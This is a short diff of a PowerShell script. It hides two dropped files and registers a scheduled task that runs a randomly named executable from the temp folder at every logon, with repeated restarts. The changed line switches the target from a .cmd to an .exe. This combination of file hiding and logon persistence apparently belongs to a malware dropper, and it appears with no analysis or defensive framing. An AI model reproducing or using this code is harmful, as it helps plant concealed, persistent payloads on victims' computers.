@@ -34,7 +34,7 @@ Set-ItemProperty -Path $file -Name Attributes -Value ((Get-Item $file).Attribute
 # Hide second file
 Set-ItemProperty -Path $file2 -Name Attributes -Value ((Get-Item $file2).Attributes -bor $attr)
 
-$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\wsappa.cmd'
+$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\wsappa.exe'
 $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
 $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10
 
